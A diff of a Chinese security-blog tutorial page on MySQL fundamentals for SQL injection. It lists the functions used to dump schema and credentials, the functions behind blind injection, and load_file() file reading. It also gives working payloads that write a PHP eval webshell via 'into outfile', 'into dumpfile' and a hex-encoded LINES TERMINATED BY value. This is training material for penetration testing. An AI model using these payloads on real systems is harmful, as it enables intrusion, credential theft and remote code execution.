@@ -15,29 +15,32 @@
 
 
 
-<meta name="description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os   #操作系统版本 @basedir      #MySQL安装路径 version()     #MySQL版本 user()        #当前数据库用户 @@datadir     #数据库路径 database()    #当前所处数据库名">
+<meta name="description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os：操作系统版本 @basedir：MySQL安装路径 version()：MySQL版本 user()：当前数据库用户 @@datadir：数据库路径 database()：当前所处数据库名">
 <meta name="keywords" content="SQL注入,MySQL">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0x00-SQL注入系列之MySQL基础知识">
+<meta property="og:title" content="Chapter 1：SQL注入系列之MySQL基础知识">
 <meta property="og:url" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/index.html">
 <meta property="og:site_name" content="IT技术学习分享自留地">
-<meta property="og:description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os   #操作系统版本 @basedir      #MySQL安装路径 version()     #MySQL版本 user()        #当前数据库用户 @@datadir     #数据库路径 database()    #当前所处数据库名">
+<meta property="og:description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os：操作系统版本 @basedir：MySQL安装路径 version()：MySQL版本 user()：当前数据库用户 @@datadir：数据库路径 database()：当前所处数据库名">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312102557.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312103951.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312145852.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312105054.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312105317.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/01.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/02.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/03.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/04.png">
 <meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312110721.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图201903121458ss52.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312151404.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312151644.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312152525.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/05.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/06.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/07.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/08.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/09.png">
 <meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312143549.png">
-<meta property="og:updated_time" content="2019-03-12T08:30:00.690Z">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142002.png">
+<meta property="og:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142657.png">
+<meta property="og:updated_time" content="2019-03-18T07:06:33.812Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="0x00-SQL注入系列之MySQL基础知识">
-<meta name="twitter:description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os   #操作系统版本 @basedir      #MySQL安装路径 version()     #MySQL版本 user()        #当前数据库用户 @@datadir     #数据库路径 database()    #当前所处数据库名">
+<meta name="twitter:title" content="Chapter 1：SQL注入系列之MySQL基础知识">
+<meta name="twitter:description" content="一、MySQLi常用函数0x00 系统函数 @@version_compile_os：操作系统版本 @basedir：MySQL安装路径 version()：MySQL版本 user()：当前数据库用户 @@datadir：数据库路径 database()：当前所处数据库名">
 <meta name="twitter:image" content="https://sakuxa.com/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312102557.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
@@ -70,7 +73,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>0x00-SQL注入系列之MySQL基础知识 | IT技术学习分享自留地</title>
+<title>Chapter 1：SQL注入系列之MySQL基础知识 | IT技术学习分享自留地</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -197,7 +200,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cheatsheet/">Cheatsheet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Getshell/">Getshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML文档解析/">HTML文档解析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Language/">Language</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OWASP-Top10-2017/">OWASP Top10 2017</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPCMSv9/">PHPCMSv9</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Payload/">Payload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/任意文件下载/">任意文件下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/干货/">干货</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/必会技能/">必会技能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技术/">技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/收集/">收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件权限/">文件权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/权限提升/">权限提升</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码与解码/">编码与解码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤与绕过/">过滤与绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶场/">靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li></ul>
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cheatsheet/">Cheatsheet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Getshell/">Getshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML文档解析/">HTML文档解析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Language/">Language</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OWASP-Top10-2017/">OWASP Top10 2017</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPCMSv9/">PHPCMSv9</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Payload/">Payload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python基础/">Python基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/任意文件下载/">任意文件下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/干货/">干货</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/必会技能/">必会技能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技术/">技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/收集/">收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件权限/">文件权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/权限提升/">权限提升</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境搭建/">环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码与解码/">编码与解码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤与绕过/">过滤与绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶场/">靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li></ul>
                     </div>
                 </section>
                 
@@ -293,7 +296,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      0x00-SQL注入系列之MySQL基础知识
+      Chapter 1：SQL注入系列之MySQL基础知识
     </h1>
   
 
@@ -319,157 +322,225 @@
       
           
         <h2 id="一、MySQLi常用函数"><a href="#一、MySQLi常用函数" class="headerlink" title="一、MySQLi常用函数"></a>一、MySQLi常用函数</h2><h3 id="0x00-系统函数"><a href="#0x00-系统函数" class="headerlink" title="0x00 系统函数"></a>0x00 系统函数</h3><ul>
-<li>@@version_compile_os   #操作系统版本</li>
-<li>@basedir      #MySQL安装路径</li>
-<li>version()     #MySQL版本</li>
-<li>user()        #当前数据库用户</li>
-<li>@@datadir     #数据库路径</li>
-<li>database()    #当前所处数据库名</li>
+<li><strong><code>@@version_compile_os</code></strong>：操作系统版本</li>
+<li><strong><code>@basedir</code></strong>：MySQL安装路径</li>
+<li><strong><code>version()</code></strong>：MySQL版本</li>
+<li><strong><code>user()</code></strong>：当前数据库用户</li>
+<li><strong><code>@@datadir</code></strong>：数据库路径</li>
+<li><strong><code>database()</code></strong>：当前所处数据库名</li>
 </ul>
 <a id="more"></a>
 <p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312102557.png" alt></p>
-<h3 id="0x01-字符串拼接函数"><a href="#0x01-字符串拼接函数" class="headerlink" title="0x01 字符串拼接函数"></a>0x01 字符串拼接函数</h3><blockquote>
+<h3 id="0x01-字符串拼接函数"><a href="#0x01-字符串拼接函数" class="headerlink" title="0x01 字符串拼接函数"></a>0x01 字符串拼接函数</h3><ul>
+<li><strong><code>Concat()</code></strong></li>
+<li><strong><code>Concat_WS()</code></strong></li>
+<li><strong><code>GROUP_CONCAT()</code></strong></li>
+</ul>
+<blockquote>
 <p>在MySQLi中，拼接函数的作用在于将多行数据合并为一行，因为在注入中有时候能显示的行数是有限的。</p>
 </blockquote>
-<p><strong>Concat(str1,str2,…)</strong></p>
+<p><strong>1.Concat(str1,str2,…)</strong></p>
 <p>返回结果为拼接参数得到的字符串。</p>
 <p>如有任何一个参数为NULL,则返回值为NULL。可以有一个或多个参数。</p>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312103951.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/01.png" alt></p>
 <ul>
-<li><p><code>select concat(user,&quot;,&quot;,password) from mysql.user;</code></p>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312145852.png" alt></p>
-</li>
+<li><strong><code>select concat(user,&quot;,&quot;,password) from mysql.user;</code></strong></li>
 </ul>
-<p><strong>Concat_WS(separator,str1,str2,…)</strong></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/02.png" alt></p>
+<p><strong>2.Concat_WS(separator,str1,str2,…)</strong></p>
 <p><code>separator</code>为拼接字符串之间的分隔符。</p>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312105054.png" alt></p>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312105317.png" alt></p>
-<p><strong>GROUP_CONCAT()</strong></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/03.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/04.png" alt></p>
+<p><strong>3.GROUP_CONCAT()</strong></p>
 <p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312110721.png" alt></p>
 <p>将DBMS中所有数据库名作为一列返回：</p>
 <ul>
-<li><code>select group_concat(schema_name) from information_schema.schemata;</code></li>
+<li><strong><code>select group_concat(schema_name) from information_schema.schemata;</code></strong></li>
 </ul>
 <p>将指定数据库的所有表名作为一列返回：</p>
 <ul>
-<li><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;db_name&#39;;</code></li>
+<li><strong><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;db_name&#39;;</code></strong></li>
 </ul>
 <p>将指定数据表的所有列名作为一列返回：</p>
 <ul>
-<li><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;tb_name&#39;;</code></li>
+<li><strong><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;tb_name&#39;;</code></strong></li>
 </ul>
 <h3 id="0x02-字符-数字函数"><a href="#0x02-字符-数字函数" class="headerlink" title="0x02 字符/数字函数"></a>0x02 字符/数字函数</h3><ul>
-<li>ASCII(): 返回字符对应的ASCII码值。</li>
-<li>ord()：返回字符对应的ASCII码值。</li>
-<li>CHAR()：返回数字对应的ASCII字符。</li>
+<li><strong><code>ASCII()</code></strong>: 返回字符对应的ASCII码值。</li>
+<li><strong><code>ORD()</code></strong>：返回字符对应的ASCII码值。</li>
+<li><strong><code>CHAR()</code></strong>：返回数字对应的ASCII字符。</li>
 </ul>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图201903121458ss52.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/05.png" alt></p>
 <ul>
-<li>BIN(): 返回数字对应的二进制串。</li>
-<li>CONV(Num,from_base,to_base): 数字进制转换。</li>
+<li><strong><code>BIN()</code></strong>: 返回数字对应的二进制串。</li>
+<li><strong><code>CONV(Num,from_base,to_base)</code></strong>: 数字进制转换。</li>
 </ul>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312151404.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/06.png" alt></p>
 <ul>
-<li>HEX():十六进制编码</li>
-<li>UNHEX()：十六进制解码</li>
+<li><strong><code>HEX()</code></strong>:十六进制编码</li>
+<li><strong><code>UNHEX()</code></strong>：十六进制解码</li>
 </ul>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312151644.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/07.png" alt></p>
 <ul>
-<li>FLOOR()：向下取整</li>
-<li>ROUND()：用于产生一个0~1的随机数</li>
+<li><strong><code>FLOOR()</code></strong>：向下取整</li>
+<li><strong><code>RAND()</code></strong>：用于产生一个0~1的随机数</li>
 </ul>
-<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312152525.png" alt></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/08.png" alt></p>
 <ul>
-<li>LOWER()：转成小写字母</li>
-<li>UPPER(): 转成大写字母</li>
+<li><strong><code>LOWER()</code></strong>：转成小写字母</li>
+<li><strong><code>UPPER()</code></strong>: 转成大写字母</li>
 </ul>
 <h3 id="0x03-字符串切片函数"><a href="#0x03-字符串切片函数" class="headerlink" title="0x03 字符串切片函数"></a>0x03 字符串切片函数</h3><ul>
-<li>MID(string，start，count)  #从字符串下标为<code>start</code>处开始切取<code>count</code>个字符。</li>
-<li>SUBSTR() #同上</li>
-<li>SUBSTRING()</li>
-<li>LEFT(string, n)  #获取从字符串左边开始的指定n个字符。</li>
-<li>len()  #返回文本字段中值的长度。</li>
+<li><strong><code>MID(string，start，count)</code></strong>：从字符串下标为<code>start</code>处开始切取<code>count</code>个字符（下标从1开始）。</li>
+<li><strong><code>SUBSTR()</code></strong>：同上。</li>
+<li><strong><code>SUBSTRING()</code></strong>：同上。</li>
+<li><strong><code>LEFT(string, n)</code></strong>：获取从字符串左边开始的指定n个字符。</li>
 </ul>
-<h3 id="0x02-读文件"><a href="#0x02-读文件" class="headerlink" title="0x02 读文件"></a>0x02 读文件</h3><p><strong>load_file()</strong></p>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/09.png" alt></p>
+<h3 id="0x04-盲注相关函数"><a href="#0x04-盲注相关函数" class="headerlink" title="0x04 盲注相关函数"></a>0x04 盲注相关函数</h3><ul>
+<li><strong><code>sleep(n)</code></strong>：阻塞n秒。</li>
+<li><strong><code>len()</code></strong>：返回字符串的长度。</li>
+<li><strong><code>if(expr1,expr2,expr3)</code></strong>：如果expr1是TRUE ，则值为expr2; 否则为 expr3。</li>
+</ul>
+<h3 id="0x05-读文件-Load-file"><a href="#0x05-读文件-Load-file" class="headerlink" title="0x05 读文件 Load_file()"></a>0x05 读文件 Load_file()</h3><blockquote>
 <p>读取文件并返回该文件的内容作为一个字符串，读取失败返回NULL。</p>
-<p>使用条件：</p>
-<blockquote>
-<ul>
-<li>连接数据库的用户有<code>file_priv</code>权限，启动<code>mysqld</code>用户必须拥有对此文件读取的权限。<ul>
-<li>查看用户的<code>file_priv</code>权限：<code>select User,File_priv from mysql.user;</code></li>
-</ul>
-</li>
-<li>欲读取文件必须在服务器上。</li>
-<li>必须指定文件的绝对路径。</li>
-<li>欲读取文件必须小于 max_allowed_packet。<ul>
-<li><code>show global variables like &quot;max_allow%&quot;;</code></li>
-</ul>
-</li>
-<li>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。<ul>
-<li><code>show  variables like &quot;secure_file%&quot;;</code></li>
-</ul>
-</li>
-</ul>
 </blockquote>
-<p>使用例子：</p>
-<p>注意路径符号的处理，要么使用<code>/</code>，使用Windows的<code>\</code>需要进行转义，即<code>\\</code>。</p>
+<p><strong>使用条件</strong>：</p>
 <blockquote>
-<ul>
-<li><code>SELECT LOAD_FILE(&quot;C://TEST.txt&quot;)</code></li>
-<li><code>SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;)</code></li>
-<li><code>SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;)</code></li>
-<li><code>SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code><ul>
-<li><code>CHAR(67,58,92,92,84,69,83,84,46,116,120,116)</code>得到的是<code>C:\\TEST.txt</code>。</li>
-</ul>
+<ol>
+<li><p>连接数据库的用户有<code>file_priv</code>权限，启动<code>mysqld</code>用户必须拥有对此文件读取的权限。</p>
+<blockquote>
+<p>查看用户的<code>file_priv</code>权限：<code>select User,File_priv from mysql.user;</code></p>
+</blockquote>
 </li>
-<li><code>SELECT LOAD_FILE(0x433a5c5c544553542e747874)</code><ul>
-<li><code>0x433a5c5c544553542e747874</code>是<code>C:\\TEST.txt</code>经过十六进制编码得到的。</li>
-</ul>
+<li><p>欲读取文件必须在服务器上。</p>
 </li>
-</ul>
+<li><p>必须指定文件的绝对路径。</p>
+</li>
+<li><p>欲读取文件必须小于 max_allowed_packet。</p>
+<blockquote>
+<p>查看允许最大包长度：<code>show global variables like &quot;max_allow%&quot;;</code></p>
+</blockquote>
+</li>
+<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。</p>
+<blockquote>
+<p>查看允许读取的路径：<code>show  variables like &quot;secure_file%&quot;;</code></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p><strong>使用例子：</strong></p>
+<blockquote>
+<p> 注意路径符号的处理，要么使用<code>/</code>，使用Windows的<code>\</code>需要进行转义，即<code>\\</code>。</p>
+<ol>
+<li><p><strong><code>SELECT LOAD_FILE(&quot;C://TEST.txt&quot;)</code></strong></p>
+</li>
+<li><p><strong><code>SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;)</code></strong></p>
+</li>
+<li><p><strong><code>SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;)</code></strong></p>
+</li>
+<li><p><strong><code>SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116))</code></strong></p>
+<blockquote>
+<p><code>CHAR(67,58,92,92,84,69,83,84,46,116,120,116)</code>得到的是<code>C:\\TEST.txt</code>。</p>
+</blockquote>
+</li>
+<li><p><strong><code>SELECT LOAD_FILE(0x433a5c5c544553542e747874)</code></strong></p>
+<blockquote>
+<p><code>0x433a5c5c544553542e747874</code>是<code>C:\\TEST.txt</code>经过十六进制编码得到的。</p>
+</blockquote>
+</li>
+</ol>
 </blockquote>
 <h3 id="0x03-写（导入）文件"><a href="#0x03-写（导入）文件" class="headerlink" title="0x03 写（导入）文件"></a>0x03 写（导入）文件</h3><p><strong>select … into outfile ‘filepath’</strong></p>
 <p><strong>select … into dumpfile ‘filepath’</strong></p>
+<blockquote>
 <p>可以把查询的行写入一个文件中。</p>
-<p>使用条件：</p>
-<blockquote>
-<ul>
-<li>连接数据库的用户有<code>file_priv</code>权限，且启动<code>mysqld</code>的用户对目录需要有写权限。</li>
-<li>文件路径必须为绝对路径，<code>file_name</code>不能是一个已经存在的文件。</li>
-<li>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。当<code>secure_file_priv</code>的值为空白，表示可以导入任意目录。<ul>
-<li><code>show  variables like &quot;secure_file%&quot;;</code></li>
-</ul>
-</li>
-</ul>
 </blockquote>
-<p>写入Webshell条件：</p>
+<p><strong>使用条件</strong>：</p>
 <blockquote>
-<ul>
+<ol>
+<li><p>连接数据库的用户有<code>file_priv</code>权限，且启动<code>mysqld</code>的用户对目录需要有写权限。</p>
+</li>
+<li><p>文件路径必须为绝对路径，<code>file_name</code>不能是一个已经存在的文件。</p>
+</li>
+<li><p>如果<code>secure_file_priv</code>非NULL，则只能读取对应目录下的文件。当<code>secure_file_priv</code>的值为NULL ，表示限制<code>mysqld</code>不允许导入|导出。当<code>secure_file_priv</code>的值为空白，表示可以导入任意目录。</p>
+<blockquote>
+<p><code>show  variables like &quot;secure_file%&quot;;</code></p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p><strong>写入Webshell条件</strong>：</p>
+<blockquote>
+<ol>
 <li>需要知道网站的绝对物理路径，这样导出后的webshell可访问。</li>
 <li>写入的目录有写权限。</li>
 <li><code>secure_file_priv</code>非NULL且包含了WEB路径。</li>
-</ul>
+</ol>
 </blockquote>
-<p>写入Webshell：</p>
+<p><strong>写入Webshell</strong>：</p>
 <blockquote>
 <ul>
-<li><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into outfile &quot;X:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;;</code></li>
-<li><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into dumpfile &quot;X:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;;</code></li>
+<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into outfile &quot;X:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;;</code></strong></li>
+<li><strong><code>select &quot;&lt;?php @eval($_POST[sh4douu])?&gt;&quot;  into dumpfile &quot;X:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;;</code></strong></li>
 </ul>
 </blockquote>
-<p><code>LINES TERMINATED BY</code></p>
+<p><strong>LINES TERMINATED BY</strong></p>
+<p>用于不是<code>Union Select</code>时。</p>
 <blockquote>
-<ul>
-<li><code>Select version() into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY [十六进制数据]</code></li>
-<li><code>Select user From mysql.user where user=&quot;root&quot; limit 1 into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;</code></li>
-</ul>
+<ol>
+<li><p>使用格式：</p>
+<blockquote>
+<p><strong><code>Select version() into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY [十六进制数据]</code></strong></p>
 </blockquote>
-<p><code>0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;</code>是经过十六进制编码后的<code>&lt;?php @eval($_POST[sh4douu])?&gt;</code>，<code>Lines Terminated By</code>就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为<code>root</code>，之后的一句话木马是<code>Lines Terminated By</code>之后的十六进制数据解码得到的字符。</p>
-<p>此外还有<code>FIELDS TERMINATED BY</code>也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。</p>
+</li>
+<li><p>例子：</p>
+<blockquote>
+<p><strong><code>Select user From mysql.user where user=&quot;root&quot; limit 1 into outfile &#39;X:/phpstudy/PHPTutorial/WWW/shell.php&#39; LINES TERMINATED BY 0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E;</code></strong></p>
+<blockquote>
+<p>0x3C3F70687020406576616C28245F504F53545B736834646F75755D293F3E是经过十六进制编码后的<code>&lt;?php @eval($_POST[sh4douu])?&gt;</code>，<code>Lines Terminated By</code>就是在查询到的数据最后再加入指定的数据然后一并写到文件中。如下图，查询到数据为<code>root</code>，之后的一句话木马是<code>Lines Terminated By</code>之后的十六进制数据解码得到的字符。</p>
+</blockquote>
+</blockquote>
+</li>
+<li><p>此外还有<code>FIELDS TERMINATED BY</code>也是类似功能，它是在查询到的数据之间插入数据，但如果查询的数据只有一列，那么将不会被插入数据。</p>
+</li>
+</ol>
+</blockquote>
 <p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190312143549.png" alt></p>
-<p><code>dumpfile</code>与<code>outfile</code>区别：</p>
-<p><code>outfile</code> 可以导出每行。<code>dumpfile</code> 只能导出一行（将目标文件写入同一行内；</p>
-<p><code>outfile</code>不可导出二进制文件，文件会被破坏，转义等。<code>dumpfile</code>可导出完整可执行二进制文件。</p>
+<p><strong>dumpfile与outfile区别</strong>：</p>
+<ol>
+<li><code>outfile</code> 可以导出每行。<code>dumpfile</code> 只能导出一行（将目标文件写入同一行内；</li>
+<li><code>outfile</code>不可导出二进制文件，文件会被破坏，转义等。<code>dumpfile</code>可导出完整可执行二进制文件。</li>
+</ol>
+<h3 id="0x04-Union-Select"><a href="#0x04-Union-Select" class="headerlink" title="0x04 Union Select"></a>0x04 Union Select</h3><p><code>UNION</code>操作符用于合并两个或多个<code>SELECT</code>语句的结果集。</p>
+<p><code>UNION</code>只是将两个查询结果联结起来在一列显示，并不是联结两个表。</p>
+<p><code>UNION ALL</code>和<code>UNION</code>不同之处在于<code>UNION ALL</code>会将所有符合条件的都列出来，既不去重复的值。而<code>UNION</code>去重。</p>
+<p><strong>使用条件</strong>：</p>
+<blockquote>
+<ol>
+<li>UNION 内部的 SELECT 语句必须拥有相同数量的列。</li>
+<li>列也必须拥有相似的数据类型。</li>
+<li>每条 SELECT 语句中的列的顺序必须相同。</li>
+</ol>
+</blockquote>
+<p><img src="/2019/03/12/0x00-SQL注入系列之Mysql基础知识/QQ截图20190318142002.png" alt></p>
+<p><strong>Order by</strong></p>
+<p><code>ORDER BY</code>语句用于根据指定的列对结果集进行排序。</p>
+<p>在SQLi中，<code>order by</code>用于寻找查询的列数，因为根据前面我们知道<code>union select</code>使用条件之一是要列数相等。</p>
+<p><code>order by</code>之后可以跟一个数字，当数字大于查询的列数时，就会报错。由此可以得知，<code>order by</code>允许接的最大数字就是实际查询的列数。</p>
